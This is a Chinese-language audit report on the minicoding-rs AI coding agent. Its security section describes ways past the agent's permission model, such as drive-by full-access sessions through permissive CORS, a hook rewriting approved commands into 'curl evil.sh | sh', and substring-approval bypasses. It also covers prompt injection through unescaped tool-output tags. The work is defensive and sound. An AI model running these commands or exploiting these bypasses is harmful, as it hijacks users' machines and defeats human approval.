# minicoding-rs 全面审查问题报告（2026-08-21，基线 v0.2.31）

> **本文地位**：对项目从零进行的第五次全面审查，**取代**此前四份审查/对比文档的分析结论
> （`review-report.md`、`improvement-design.md`、`minicoding-rs-深度对比与改进设计报告.md`、
> `minicoding-rs-代码级修改设计文档.md`——四者呈链式覆盖关系但均未标注取代状态，见 D7）。
>
> **审查方法**：五路并行源码级调研——①架构与模块边界（全量 Cargo.toml 矩阵 + core 全文通读）、
> ②安全（L0 约束逐条实现层验证 + 攻击面推演）、③服务端/协议层/前端契约、④文档漂移抽验、
> ⑤代码质量与测试基建。所有问题逐条编号（S/A/P/Q/D/R 前缀），每条含严重度与 文件:行 证据。
>
> **严重度定义**：严重=发布阻断；高=真实攻击面或约束失守；中=结构性缺陷/明确违规；
> 低=瑕疵/已知偏离/防御姿态问题。

---

## 0. 执行摘要

**总体评价**：两条架构硬红线（core 无领域依赖、无循环依赖）守住；trait 落位抽查 15 项全部
正确；C-06 replay 强制、Landlock fail-closed、unsafe 纪律、覆盖率门禁（llvm-cov ≥80% 真实
存在于 CI）达到承诺水平。**但 HTTP server 暴露面存在两个"严重"级缺陷，且一处编排缺口使
整个权限模型的审计与强制语义失效**；文档漂移已达误导数据迁移开发者的程度。共记录问题
**76 条**：严重 2、高 8、中 30、低 30、信息 3，另有正面确认 2 条（§7）。

### TOP 问题速览（完整清单见各节编号）

| # | ID | 问题 | 严重度 |
|---|----|------|--------|
| 1 | S1 | HTTP server 全端点零鉴权，权限决策可被任意本机进程代答 | **严重** |
| 2 | S2 | CORS 默认 Allow Any → 浏览器 drive-by full-access RCE 链 | **严重** |
| 3 | S4 | PreToolUse Hook `modify_input` 后不重做策略检查 | 高 |
| 4 | S7 | last-known-good 配置把明文 api_key 落盘且 0644 | 高 |
| 5 | S5/S6 | 黑名单不覆盖 shell 工具；预批准缓存子串匹配可绕过 | 高 |
| 6 | S8/S9 | shell.run 超时上限由 LLM 控制且无进程组清理 | 高 |
| 7 | S11 | OS 沙箱无 seccomp/网络过滤，"沙箱内"可自由外传数据 | 高 |
| 8 | A7 | memory→storage 领域交叉依赖（唯一依赖红线违规） | 中 |
| 9 | A8 | 架构守卫只护 core，领域层互查盲区放过了 A7 | 中 |
| 10 | D1 | JSONL 格式文档与磁盘事实完全脱节 | 中 |

---

## 1. 安全问题（S1–S28）

### 暴露面

- **S1【严重】HTTP server 全端点零鉴权，权限决策可被任意客户端代答**
  证据：`crates/minicoding-server/src/http.rs:300-329` 路由表无任何 auth 中间件；
  `POST /sessions/{id}/permissions/{pid}`（http.rs:584-594）接受任意 decision；
  `GET /sessions`（http.rs:496-499）枚举全部会话。会话隔离仅依赖 ULID 不可猜测。
  场景：能访问端口的任意本机进程/容器邻居可读全部会话内容、替用户批准其注入的命令、
  取消 turn——完整劫持 Agent。
- **S2【严重】CORS 默认 Allow Any，构成浏览器 drive-by RCE 链**
  证据：http.rs:283-288（空列表 = `allow_origin(Any)+methods(Any)+headers(Any)`），
  main.rs:62-64 注释自认"默认允许任意来源"——与 AGENTS.md §8.6"默认仅 localhost:*"
  直接相反。场景：用户浏览器中任意网页可预检通过后 `POST /sessions {"preset":"full-access"}`
  → `POST /messages` → 无弹窗执行任意命令。
- **S3【高】full-access preset 经 API 一个参数即生效，C-22 退化**
  证据：http.rs:456-458（"API 传参视为显式选定"）与 478-485——无交互无二次确认，
  仅一条 tracing 红字。C-22 要求的"显式选定 + red 警告 + 二次确认"在 server 路径缺失。

### 权限模型

- **S4【高】PreToolUse Hook `modify_input` 后不对修改后输入重做策略检查**
  证据链：rt.rs:1384（policy.check 用原始 call）→ rt.rs:1689-1692（Hook 就地替换
  `effective_call.input`）→ rt.rs:1417（决策解析仍基于原始 verdict）→ rt.rs:1450（dispatch
  执行改后 input）。场景：批准命令 X 后 Hook 改为 `curl evil.sh | sh` 直接执行——黑名单/
  路径策略对该输入从未生效；审计记"批准了 X"实际执行 Y。注释（rt.rs:1654-1655）声称
  "仍经 sandbox_path 校验"对命令类工具不成立。
- **S5【高】内置黑名单覆盖面极窄，shell 类工具不在保护范围**
  证据：builtin.rs:237-242——`is_blacklisted` 仅覆盖 `fs.delete` 删 AGENTS.md/CLAUDE.md。
  `shell.run "rm AGENTS.md"`、`echo injected > AGENTS.md` 只走普通 Ask 且选项含
  AllowAlways（builtin.rs:325-332）——一次批准永久放行，C-23 失守于最普通组合。
- **S6【高】plan.exit 预批准缓存子串匹配可拼接绕过**
  证据：builtin.rs:127-142——`command_text.contains(&p.prompt)`（注释自称前缀匹配更严格，
  实现为任意位置子串匹配）。场景：缓存 `"cargo test"` 后提交 `git push --force; echo cargo test`
  → contains 命中 → 无弹窗执行任意命令。
- **S13【中】MCP 工具凭远端自报 readOnlyHint 完全跳过权限**
  证据：mcp/client/wrapper.rs:51-57（`ReadOnly => SideEffect::None`）配合 rt.rs:1179-1184
  分桶进只读桶并行执行，全程不经 policy/prompter/审计。信任边界画在不受信任远端进程的
  自我声明上。
- **S14【低】未知工具分桶 fail-open**
  rt.rs:1180-1184 `is_none_or(...)` 默认归免检只读桶；当前靠 dispatch NotFound 兜底，
  属防御姿态问题，懒注册语义变化即成真绕过。
- **S23【低】PermissionContext 恒为 `turn: 0, history: []`**
  rt.rs:1377-1378——策略无法基于历史做聚合判定（如 AllowAlways 频控）。

### 凭证与数据落盘

- **S7【高】last-known-good 配置把解析后的明文 api_key 落盘且 0644**
  证据：config.rs:340-348——`load_config` 先 `resolve_env_vars`（config.rs:320-327）再
  `toml::to_string` 写 `.last-known-good.toml`（paths.rs:49-51），`std::fs::write` 无 0600。
  即使用户规范使用 `env:` 引用，明文 key 仍复制到磁盘另一处全员可读，直接违反 C-04。
- **S19【中】会话转录文件无权限控制，shell 输出中的秘密原文落盘**
  storage 中仅 audit.log 设 0600（audit.rs:48-55）；`{id}.jsonl`/.events.jsonl/.snapshot.json
  默认权限。fs.read 对敏感文件名有脱敏（read.rs:147-152），但 shell.run 的 `printenv`/
  `cat .env` 输出整段进入 ToolResult 并落盘。
- **S20【低】HTTP 创建会话接受客户端传入 api_key**
  http.rs:163-164、http.rs:414；与 ndjson.rs:35"客户端不传凭证（C-04）"声明不一致。

### 路径与输出边界

- **S15【中】路径校验双实现并存且已漂移**
  tools/lib.rs:11-12 声称"委托 minicoding-policy::path_sandbox，不重复实现"；实际所有 fs
  工具用本地 util::resolve_path（util.rs:15-44），两者算法不同（policy 版回溯最长存在祖先，
  tools 版只归一一层父目录）。两套 C-03 语义独立演化即是漏洞温床。
- **S16【中】fs.write 的 NotFound 回退分支执行未经校验的越界 create_dir_all**
  fs/write.rs:86-98——对原始候选路径 parent 直接 `tokio::fs::create_dir_all`，无 workdir
  包容检查。结合 S4 或自定义 policy 可在 workdir 外创建目录（最终写入仍 fail-closed）。
- **S17【低】canonicalize 校验与实际 IO 之间 TOCTOU**
  path_sandbox.rs:42-67 / util.rs:15-44 先校验后另行打开，无 openat2(REQUIRE_NO_SYMLINKS)
  同 fd 操作；本地攻击者可置换符号链接逃逸。应用层沙箱固有局限，文档未披露。
- **S18【低】journal 恢复路径校验用字符串前缀**
  journal_impl.rs:279-283 `starts_with(wd_str)` 存在组件边界缺陷（/tmp/abc-evil 误判为
  /tmp/abc 下）；因相对路径此时必无 `..` 段实际可利用性低，但与 path_sandbox.rs:12-13 自己
  总结的教训相悖。
- **S21【中】`wrap_tool_output` 不转义字面闭合标签（C-05）**
  providers/common/mod.rs:60-66——content 含 `</tool_output>` 时边界提前闭合（三个 provider
  同型：openai.rs:268、anthropic.rs:267、ollama.rs:258）；web.fetch 抓攻击者页面可实现
  跨边界 prompt injection。
- **S22【中】web.fetch 重定向后不复检 SSRF/DNS rebinding**
  fetch.rs:88-89——首跳经 ssrf 校验，跟随 redirect 后未复检目标。

### 资源与沙箱

- **S8【高】shell.run 超时上限由 LLM 输入控制**
  run.rs:100-103——`timeout_ms.map_or(default, Duration::from_millis)`，schema 仅
  `"minimum": 0` 无上限；`timeout_ms: u64::MAX` 使 C-07 形同虚设。
- **S9【高】无进程组约束，超时 kill 不清子进程树**
  run.rs:164-167 注释自认"当前简化为单进程 kill；M4 将接入进程组"。`sh -c "sleep 3600 &"`
  超时后留孤儿进程树，反复调用即资源耗尽。
- **S10【中】输出先全量入内存后截断**
  run.rs:168-183——stdout/stderr 无上限缓冲后才截断（MAX_OUTPUT_CHARS=10_000），超时窗口内
  `cat /dev/urandom` 可打爆内存；web.fetch 同型（fetch.rs:111-130 全量 text() 后截断）。
- **S11【高】OS 沙箱不含 syscall/网络过滤，第二道防线对外泄零作用**
  sandbox/Cargo.toml:19-22 自认 libseccomp 未接入；Landlock ABI V3 仅文件系统
  （linux.rs:32-34）；Seatbelt 显式 `(allow network*)`（macos.rs:172）。WorkspaceWrite
  "沙箱内"命令可自由 curl 外传数据/访问元数据接口。
- **S12【中】VCS 目录写保护跨平台不一致，Linux 实际失效且应用层补偿不存在**
  linux.rs:20-24 自认 landlock 并集语义下 .git 随 workdir 可写；macOS 靠 deny>allow 有效；
  builtin.rs 无任何 .git 补偿逻辑（vcs_protected_dirs 未被引用）。`fs.write .git/hooks/pre-commit`
  可植入持久化 hook 后门。
- **S24【低】Windows 驱动策略快照竞态**
  windows.rs:34-38 单槽 `last_policy: Mutex<Option<_>>`，apply/post_spawn 非原子，
  共享 driver 并发时可能给 A 进程套 B 的 Job 限制。
- **S25【低】Windows Job 允许脱离 + doctor 高估防护**
  windows.rs:113 `JOB_OBJECT_LIMIT_BREAKAWAY_OK` 允许子进程主动脱离；无文件系统隔离时
  `is_hardened()` 仍返回 true（windows.rs:99-101）。
- **S26【低】Seatbelt profile 临时文件名可预测且写入跟随符号链接**
  macos.rs:106-112 `/tmp/minicoding-seatbelt-{pid}-{nanos}.sb`，多用户主机存在替换竞争窗口。
- **S27【低】NoopDriver 降级仅告警后继续，缺用户显式确认**
  driver.rs:57-61——沙箱驱动降级到 Noop 时仅 warn 日志即放行后续执行；C-22 要求的
  "降级需用户显式选定"在该路径缺失（与初始化失败询问回退 rt.rs:1860-1893 的处理不对称）。
- **S28【低】/undo 不记审计**
  interactive.rs:181-209——AGENTS.md §5.5 与 C-28 要求反向恢复也落 audit.log，实现缺失。

---

## 2. 架构与模块边界（A1–A19）

### core"零实现"名实差（core 合计 13121 行，占 workspace 22%）

- **A1【中】HookRegistry::dispatch 是约 140 行完整领域算法却留在 core**
  hooks/trait_def.rs:495-594,600-682——串行执行、超时包装（run_hook_once:624）、错误处置映射、
  含 C-21 安全裁决的 merge_decision:648、asyncRewake 白名单校验。文件名 trait_def 但全文
  2007 行过半为实现；Hook 执行语义的安全强制点脱离 minicoding-hooks。
- **A2【低】手写 glob 匹配违反选型表，且规范文件互相矛盾**
  trait_def.rs:161-197 手写贪心通配符匹配，违反 AGENTS.md §3.6"Glob 用 globset 不自研"；
  docs/modules.md:383 记录相反决策（不引 globset 入 core）——两份规范矛盾未收敛。
- **A3【低】repair_dangling_tool_calls 完整修复算法藏在 model 层**
  model/message.rs:215-260——扫描全历史/合成 ToolResult/幂等保证，被 rt.rs:422 调用，
  属"藏在 core 的领域逻辑"而非数据模型。
- **A4【低】死循环检测三件套内联 Runtime**
  rt.rs:993-1029,783-842——tool_fingerprint/tool_calls_signature/is_repeating + [3,5,8] 分级，
  与压缩熔断、沙箱熔断并列第三套散落的检测算法。
- **A5【低】面向 LLM/用户的提示文案硬编码在 core 抽象层**
  sandbox/breaker.rs:145-159 soft_trip_reminder/hard_trip_summary 中文文案属领域表现层内容。
- **A6【低】PlanModeController 唯一真实现在 core**
  rt.rs:2219-2253 PlanControllerHandle 是有状态真实现（非 Noop 兜底），违背 trait 定义在
  core/实现在领域 crate 的对位原则。

### 依赖方向

- **A7【中】memory→storage：唯一的领域 crate 交叉依赖**
  memory/Cargo.toml:13；session_sum.rs:21（use minicoding_storage::SessionIndex）、:222
  （save_summary 直接改写 storage 索引）。违反 AGENTS.md §3.2"领域 crate 经 core trait
  解耦"；modules.md:355 还声称 memory 只依赖 core（文档漂移掩盖违规，见 D9）。
- **A8【中】架构守卫存在系统性盲区**
  core/tests/architecture.rs 仅断言 core 不依赖领域 crate 与 features 白名单；无任何测试
  断言"领域 crate 互不依赖""领域 crate 不依赖 frontend"——A7 正是从该盲区漏掉。
- **A9【中】core 依赖白名单事实扩容至 17 项而文档仍写 9 项**
  architecture.rs:15-33 白名单含 tokio-util/futures/toml/ulid/home/semver/**notify**(平台相关
  FS 监听库)/ts-rs；modules.md:247 与 AGENTS.md §3.5 声明 9 项。"轻量无平台"措辞实质放松
  且失去文档监督意义。
- **A10【中】"tools 是唯一组合层"实际三处打破，server 依赖 10 个 workspace crate**
  server/Cargo.toml:20-30 实际依赖 core+protocol+policy+tools+context+storage+providers+
  memory+journal+sandbox（modules.md:76 写"core+protocol+tools"）；组装逻辑分散于
  cli/builder.rs、server/runtime_builder.rs、sdk 三处。
- **A11【中】tui 依赖 cli 复用 build_runtime**
  tui/Cargo.toml:23、main.rs:22（use minicoding_cli::builder）——TUI 二进制传递引入
  clap/keyring/tar/flate2 等纯 CLI 依赖；builder 组装应下沉共享层（sdk 或独立 bootstrap）。
- **A12【低】desktop 直接依赖 core 读写 config.toml**
  desktop/Cargo.toml:15、config.rs:13-14；modules.md:923 明确说它"不直接依赖 core"——
  桌面壳与 sidecar 双头访问同一配置文件是隐性共享状态。
- **A13【低】sdk 导出生产级 InMemoryStorage，与测试版重复实现**
  sdk/src/store.rs:24-37 是 pub 生产 API；与 core/tests/common/mod.rs 的测试版
  InMemoryStorage 平行重复。按"实现在领域 crate"应在 minicoding-storage 提供。
- **A18【低】tools↔Runtime 运行期双向调用耦合**
  task/spawn.rs:34,41-45 持 Arc<dyn SubagentRunner> 反呼 Runtime；plan/exit.rs:18,27 持
  Arc<dyn PlanModeController>。编译期单向合法且经 trait 解耦，但 tools 行为无法脱离
  Runtime 语义单独验证（spawn.rs:316、exit.rs:207 均 mock）。
- **A19【低】配置热更是三方时序耦合**
  config/watcher.rs:18-19,63-65（std mpsc + std::thread debounce）→ EventBus 广播 →
  rt.rs:710,1530 turn 边界消费。"变更下一 turn 生效"仅是隐式约定，无类型层保障。

### feature gate

- **A14【中】otel 默认哲学分裂**
  server/Cargo.toml `default = ["otel"]`（拉入 OTLP→reqwest 网络栈）vs cli opt-in——
  同为二进制入口两种默认，嵌入方/发行版裁剪易踩坑。
- **A15【低】server 的 acp 是死 feature**
  Cargo.toml `acp = []` 无 dep 映射、源码零 cfg 引用，acp.rs 恒编译；与 lsp 的全套 cfg
  门控风格不一致。
- **A16【低】tools/Cargo.toml:33-42 整块注释掉的 optional 依赖残留**
  "M0 占位"至今未落实也未删除，误导性死配置。
- **A17【低】cli 默认 feature 组合不对称**
  default 带 serve/mcp 却不带 hooks/file-undo，无理由注记；与 AGENTS.md §3.5 示例亦不同。

---

## 3. 服务端 / 协议层 / 前端契约（P1–P10）

- **P1【中】HTTP handler DTO 完全游离于 ts-rs 导出链之外**
  http.rs:136-237（ServerConfigResponse/CreateSessionBody/SendMessageResponse 等）仅手写
  Serialize 无 ts_rs::TS；前端 client.ts:93-178 逐字段手写镜像。core model 加字段能经
  `#[cfg_attr(feature="ts")]` 自动传导（这部分健康，From<&Event> 编译期强制同步是亮点），
  但 HTTP 层是契约漂移高发区。
- **P2【中】generated/index.ts 头部标 AUTO-GENERATED 实为手工 barrel，漏导出 7 类型**
  generated/index.ts:1-43（43 条导出）vs 目录 47 个文件；缺 Session/PromptOption/
  PreApprovedPrompt/ContextHint/SideEffect/ToolSchema/PermissionPrompt。直接后果：
  client.ts:208-213 手写 PendingPermissionDto 与生成的 PermissionPrompt 结构重复，
  违反 AGENTS.md §8.4"不手写双份"。
- **P3【中】EventKind 混入 NDJSON 专用变体，污染通用 SSE 契约**
  protocol/event.rs:90-100（SessionsListed/SessionRetrieved/CommandError）不对应 core::Event；
  前端 reducer 为它们写的 invalidate-messages 分支是死代码（chatReducer.ts:168-172）；
  任何消费 EventKind 的端都会把 NDJSON 响应类型当合法事件。
- **P4【中】ToolSchema.ts 引用 generated 目录外的绑定文件，产物不自包含**
  generated/ToolSchema.ts:3 import "../../../../minicoding-core/bindings/serde_json/JsonValue"，
  超出 tsconfig include（include:["src"]）；移动目录即断。
- **P5【低】Session.config_hash 类型谎言**
  generated/Session.ts `config_hash: bigint` 而 wire 是 JSON number；event.rs:28 对 seq 已做
  ts(type="number") 特判，此处遗漏。
- **P6【中】SSE 无心跳机制**
  sse.rs 全文无 heartbeat/ping/keep-alive（grep 证实）：空闲连接会被中间代理/NAT 静默掐断，
  EventSource 重连虽自动但期间事件丢失只能靠 pending 快照补偿，权限弹窗之外的流式体验断裂。
- **P7【低】并发语义无约定：同一会话并发 POST messages、多客户端订阅行为未文档化未测试**
  switch_workdir 有锁超时 409，消息发送路径未见等价保护说明；多端同时订阅的事件广播行为
  未测。
- **P8【低】乐观更新与 SSE message_appended 的双写窗口**
  useChat useSendMessage onMutate 追加 optimistic 消息，POST 成功后 invalidate + SSE
  message_appended 再 invalidate——两次失效间存在短暂重复渲染窗口，靠 TanStack Query
  幂等兜底，无显式去重。
- **P9【中】metrics 只进不出：无任何暴露端点**
  core/metrics.rs 有完整进程内指标 API（record_operation 等 218 处调用），server 路由表无
  /metrics 或 Prometheus exporter；OTel 仅 span 导出（otel_init.rs:161 OTLP）。生产环境无法
  采集指标，可观测性承诺（observability.md）半落地。
- **P10【信息】ACP(869 行)/LSP(794 行+lsp_prompter 181 行) 是真实实现非 stub**
  但 acp 受死 feature A15 影响、风格与 lsp 不一致；功能 parity 未见对照测试。

---

## 4. 测试与代码质量（Q1–Q7）

- **Q1【正面】测试总量与基建健康**
  按 crate 统计：tools 305 / core 248 / providers 193 / storage 116 / policy 107 / hooks 81 /
  context 81 / memory 69 / server 45 / mcp 45 / protocol 44 / tui 34 …全 workspace 约 1400+；
  proptest 用于路径沙箱与消息模型；M-13 存储契约测试双后端共享断言。
- **Q2【正面】覆盖率门禁真实存在**
  ci.yml:71-95 `cargo llvm-cov --fail-under-lines 80`；排除 tui/cli/server/desktop 的理由
  逐条注明。
- **Q3【中】非测试代码 unwrap/expect 45 处，session_mgr.rs 密集且无不变式注释**
  session_mgr.rs:303,323,333,349,371,386,534 七处锁中毒 expect；AGENTS.md §2.3 要求除有
  注释证明不会 panic。多数属锁中毒可辩护模式，但缺注释即不合规；另 testing/storage_contract.rs
  16 处 expect 属测试辅助可接受。
- **Q4【中】provider 三胞胎重复：openai/anthropic/ollama 合计 3950 行**
  SSE 解析/请求构造/错误映射高度相似；common/sse.rs 已存在但每家仍各自维护流循环——
  新增 provider 边际成本与修 bug 同步成本都高。
- **Q5【低】前端巨石组件**
  SetupDialog.tsx 527 行、WorkspacePanel.tsx 419 行、MessageList.tsx 361 行（client.ts 333 行）。
  正面：全 src 无 any 使用。
- **Q6【低】rt.rs 单文件 2335 行**
  Agent 循环+权限编排+hook 调用+熔断+热更新+事件持久化集中一处，建议按 A1 方向拆分。
- **Q7【低】排除层的覆盖率不可见**
  coverage job 排除 tui/cli/server/desktop 后这些层实际覆盖率无度量无趋势，集成测试
  是否足够无从量化。

---

## 5. 文档漂移（D1–D10）

- **D1【中】JSONL 格式描述整体过期（最严重漂移，会误导迁移/回放开发者）**
  data-model.md §2.2 展示信封结构 `{"v":1,"type":"message",...,"parent_uuid":...}` 与磁盘事实
  不符：jsonl.rs:232 直接裸序列化 Message（无 v/type 信封），字段名是 `metadata` 非 `meta`
  （message.rs:118-130），不存在 parent_uuid（index.rs 内部专用，jsonl.rs:170 写死 None）、
  meta.usage、tool_name、elapsed_ms、source=system·summarize 变体；文档也未提 `_header`
  格式版本行（jsonl.rs:226）。§2.3 字段表同样过期。
- **D2【中】design.md §2.2 主循环伪代码落后实际 ~4 个环节**
  伪代码 42-102 行仍是 6 步无界 loop；实际 rt.rs:689-903 含 turn_active guard、沙箱熔断
  reset、M-12 reload_safe_config、有界 for iter、M-08 软提醒注入、M-06 StepStarted/Ended
  双写事件、persist_event 双写、select! 三路取消（代码注释编号已到 7.1）。
- **D3【中】AGENTS.md §3.6"sandbox-run 不自研"红线已被推翻但未回收**
  tech-stack.md:216 宣布 sandbox-run 弃用（EUPL-1.2）；实际 sandbox 只有 landlock+libc
  （无 libseccomp、无 sandbox-run），驱动为自研 pre_exec 胶水；troubleshooting.md:65 仍在教
  用户装 libseccomp——三份文档三个说法，后续 AI 助手按 AGENTS.md 行事将与现状冲突。
- **D4【中】api.md §3.5 Storage trait 缺 update_summary（第 5 方法）**
  api.md:528-543 仅列 4 方法；trait.rs:42-46 实际有 update_summary（rt.rs:654、契约测试均
  在用，全文 0 处出现于 api.md）；SessionMeta 注释"首条用户消息 80 字符截断"与实现不符；
  api.md 用 trait_variant 风格签名、实际手写 BoxFuture（表述性差异）。
- **D5【中】features.md 统计分项错误**
  合计 203 碰巧等于实数，但存储分项写 16（实 17，S-27b/S-28 少计）、Web 分项写 19
  （实 20，W-20 未入统计与口径文字）；分项相加=201≠203（违反 AGENTS.md §4.6）。
- **D6【中】modules.md/AGENTS.md 的 core 白名单与 server/memory 依赖声明过期**
  见 A9/A7/A10 的文档侧证据（modules.md:247/355/76/923 四处失真）。
- **D7【中】四份审查/对比文档链式覆盖而无 supersede 标注**
  review-report.md(08-02) → improvement-design.md(08-19) → 深度对比报告(08-19) →
  代码级修改设计文档(08-19) 互相纠正，后者事实上取代前者结论；旧三份仍以现行姿态被
  README:166 导航引用。两份中文命名文档自称"19 crate"，workspace 实为 18 成员(+web npm)。
- **D8【低】README/getting-started 数字过期**
  README.md:97,145 两处"功能清单 192 项"（现 203）；getting-started.md:69"14 个 crate"
  （现 18）且通篇无 TUI 上手路径；build-guide.md 已更新——两份入门文档新旧不一致。
- **D9【低】modules.md memory 依赖声明漂移**
  modules.md:355 称 memory 只依赖 core+serde+camino，实际还依赖 minicoding-storage（A7 证据）。

---

## 6. 产品与定位（R1–R3）

- **R1【信息】四前端并行维护成本 vs 收益未校准**
  CLI/TUI/Web/Desktop 四端并进：desktop/web 已到 W-20 且 release 流水线齐全，TUI 相对薄弱
  （2353 行、34 测试、依赖 cli）。是否收缩 TUI 投入值得基于真实使用数据决策。
- **R2【低】0.2.x 版本号与破坏性变更频率不匹配**
  存储 SCHEMA_VERSION 1→2、DTO 字段增删、LKG 配置格式演进均无 CHANGELOG 与迁移指南
  （迁移说明散见于个别 commit message）；semver 语义上是长期 pre-1.0，但对下游 SDK 使用者
  缺少稳定的破坏性变更通告机制。
- **R3【信息】差异化定位表述分散**
  与 Claude Code/Codex/dsh 的差异点埋在对比报告里，README 一句话定位偏泛（"终端 AI Coding
  助手"），未突出沙箱一等公民/事件溯源/多前端等实际差异化能力。

---

## 7. 正面确认清单（审查中验证通过的项）

1. 依赖硬红线：core [dependencies] 无任何 minicoding-\*/重依赖；全 workspace 无循环依赖。
2. trait→实现落位抽查 15 项全部正确（唯一例外 A6）。
3. C-06 replay：ReplayPolicy 对副作用硬 Deny 不可透传（replay.rs:44-52），CLI 接线正确。
4. Landlock `restrict_self` 校验 FullyEnforced，fail-closed（linux.rs:129-140）。
5. 子进程 env 纪律：shell.run/ScriptHook env_clear+白名单（run.rs:114-126、script.rs:110-120）；
   sanitize_env 过滤 KEY/TOKEN/SECRET（config.rs:407-409）。
6. audit.log 0600 追加写；keyring 共享 service/account（runtime_builder.rs:127-133）；
   sidecar 不经 argv/env 传凭证（sidecar.rs:26,59）。
7. unsafe 纪律：全部集中于平台 FFI + Rust2024 set_var，均有 SAFETY 注释，无非必要 unsafe。
8. CredentialResolver/provider Debug 脱敏（credential.rs:40-46、openai.rs:1092-1103）。
9. ts-rs From<&Event> 编译期强制 protocol↔core 事件同步（亮点设计）。
10. M-13 存储契约测试（内存/JSONL 双后端共享断言）+ CI 覆盖率 ≥80% 真门禁。
11. 路径沙箱 proptest 属性测试（穿越/symlink/绝对越界拒绝）。
12. CI 九道门禁齐全（fmt/clippy/test/coverage/audit/deny/typos/cross-platform/desktop）
    + web job（oxlint/tsc/vitest/build）。

---

## 8. 建议修复路线图

### P0（立即，发布阻断级）
1. S1+S2+S3：server 启动生成 token 强制 Authorization（--auth-token 显式关闭需红字警告）；
   CORS 默认收敛 `http://localhost:*`；full-access preset 经 API 需二次确认或直接禁用。
2. S4：modify_input 生效后对 effective_call 重跑 policy.check（含黑名单），决策变化重新走
   Prompter，审计记最终输入。
3. S7：LKG 序列化前剥离 credential 字段（或仅存 env 引用原文），写盘加 0600。

### P1（近期一个迭代）
4. S5+S6：黑名单补 shell 类保护（AGENTS.md/CLAUDE.md 写删、.git/hooks 写入）；
   预批准缓存改规范化命令比对（词法级）。
5. S8+S9+S10：timeout_ms clamp 上限；进程组 killpg；流式读取+字节上限截断（shell/fetch）。
6. S13：MCP readOnlyHint 降级为首次批准时显式勾选"信任只读声明"，否则一律 Ask。
7. S21：wrap_tool_output 转义闭合标签（或改用不可能出现在内容中的定界符方案）。
8. S28：/undo 落审计。
9. P6：SSE 心跳（定时 comment line）。

### P2（中期结构性）
10. A8：架构守卫扩展为全 workspace manifest 白名单矩阵（首个抓捕对象 A7）。
11. A1+A6+A4：hooks dispatch 下沉 minicoding-hooks；rt.rs 拆出 repeat-guard/hook 编排；
    PlanControllerHandle 移交 policy。
12. A7：memory 摘要落盘改经 core trait（Storage.update_summary 已存在，直接复用即可）。
13. P1+P2+P4：HTTP DTO 进 ts-rs 导出链；index.ts 改脚本生成；JsonValue 绑定收敛进
    generated 目录。
14. S15：路径校验收敛单实现（tools util::resolve_path 内部委托 path_sandbox）。
15. S11：seccomp allowlist + 网络白名单排期；当前能力边界先写入 security.md（诚实披露）。
16. P9：/metrics 端点（Prometheus text format）或 OTel metrics 导出。

### P3（文档治理，低成本高杠杆）
17. D1：data-model.md §2.2 按真实磁盘格式重写（含 _header 行、metadata 字段、无信封）。
18. D2：design.md §2.2 伪代码补齐至实际环节（标注 M-06/M-08/M-12 插入点）。
19. D3：回收 AGENTS.md §3.6 sandbox-run 条目，改为"自研驱动 + landlock，seccomp 待接入"；
    troubleshooting.md 删 libseccomp 安装指引。
20. D4/D5/D6/D8/D9：api.md 补 update_summary；features.md 分项修正；modules.md 四处依赖
    声明刷新；README/getting-started 数字更新。
21. D7：四份旧报告头部加"Superseded by project-review-20260821.md"。

---

## 附：审查覆盖说明

- 本报告基于静态源码调研与文档对照，未做动态渗透测试；P7 的 SSE 并发语义、S27 的
  NonInteractivePrompter fallback 语义标注为待专项验证。
- 问题总数核对：S×28 + A×19 + P×10 + Q×7 + D×9 + R×3 = **76 条**
  （严重 2：S1/S2；高 8；中 30；低 30；信息 3：P10/R1/R3；正面确认 2：Q1/Q2）。
